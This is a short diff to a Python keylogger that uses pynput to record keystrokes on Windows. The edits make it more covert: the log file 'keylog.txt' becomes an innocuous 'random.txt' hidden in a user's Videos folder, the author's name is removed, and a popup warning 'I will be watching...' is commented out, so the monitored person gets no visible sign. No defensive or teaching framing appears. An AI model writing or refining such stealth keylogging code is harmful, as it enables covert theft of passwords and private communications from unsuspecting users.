@@ -1,4 +1,3 @@
-#Harrison Tarsia
 import pynput
 import os
 import ctypes
@@ -7,7 +6,7 @@ import winsound
 keystroke_count = 0
 
 # Path to save the log file
-log_file_path = r"C:\Users\Administrator\Documents\keylog.txt"
+log_file_path = r"C:\Users\ZachPrice\Videos\\random.txt"
 
 # Initialize a list
 keystrokes = []
@@ -49,7 +48,7 @@ def on_release(key):
         return False
 
 # Random popup
-show_popup("I will be watching...")
+# show_popup("I will be watching...")
 
 # Start the keylogger
 with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
